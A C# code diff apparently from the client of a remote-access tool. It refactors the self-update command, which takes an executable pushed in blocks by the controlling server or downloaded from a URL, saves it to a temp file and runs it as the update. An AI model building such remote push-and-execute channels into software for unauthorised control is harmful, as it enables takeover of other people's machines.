@@ -34,32 +34,34 @@ namespace xClient.Core.Commands
             // i dont like this updating... if anyone has a better idea feel free to edit it
             if (string.IsNullOrEmpty(command.DownloadURL))
             {
-                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
+                if (!_renamedFiles.ContainsKey(command.ID))
+                    _renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(".exe"));
+
+                string filePath = _renamedFiles[command.ID];
 
                 try
                 {
-                    if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
+                    if (command.CurrentBlock == 0 && !FileHelper.IsValidExecuteableFile(command.Block))
                         throw new Exception("No executable file");
 
                     FileSplit destFile = new FileSplit(filePath);
 
                     if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
-                    {
-                        new Packets.ClientPackets.SetStatus(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
-                            client);
-                        return;
-                    }
+                        throw new Exception(destFile.LastError);
 
                     if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
                     {
+                        if (_renamedFiles.ContainsKey(command.ID))
+                            _renamedFiles.Remove(command.ID);
                         new Packets.ClientPackets.SetStatus("Updating...").Execute(client);
-
                         ClientUpdater.Update(client, filePath);
                     }
                 }
                 catch (Exception ex)
                 {
                     NativeMethods.DeleteFile(filePath);
+                    if (_renamedFiles.ContainsKey(command.ID))
+                        _renamedFiles.Remove(command.ID);
                     new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
                 }
 
@@ -70,8 +72,7 @@ namespace xClient.Core.Commands
             {
                 new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);
 
-                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    FileHelper.GetRandomFilename(12, ".exe"));
+                string tempFile = FileHelper.GetTempFilePath(".exe");
 
                 try
                 {
